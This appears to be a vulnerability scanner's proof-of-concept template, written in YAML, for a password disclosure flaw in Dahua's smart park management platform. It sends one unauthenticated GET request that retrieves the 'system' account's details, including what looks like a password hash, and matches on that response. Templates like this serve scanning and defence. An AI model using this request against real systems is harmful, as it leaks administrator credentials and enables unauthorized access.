id: poc-yaml-dahua-zhyq-password-disclosure
info:
  name: 大华智慧园区任意密码读取漏洞
  severity: high
  tags:
  - 密码重置
  finger: 大华智慧园区综合管理平台
requests:
- method: GET
  path: /admin/user_getUserInfoByUserName.action?userName=system
  expression: status_code == 200 && contains(body,"loginName") && contains(body,"isReuse")
    && contains(body,"system") && contains(body,"f91b1ba2c0287e102527f53805656046")&&
    content_type == "text/html;charset=UTF-8"
variables: {}
transport: http
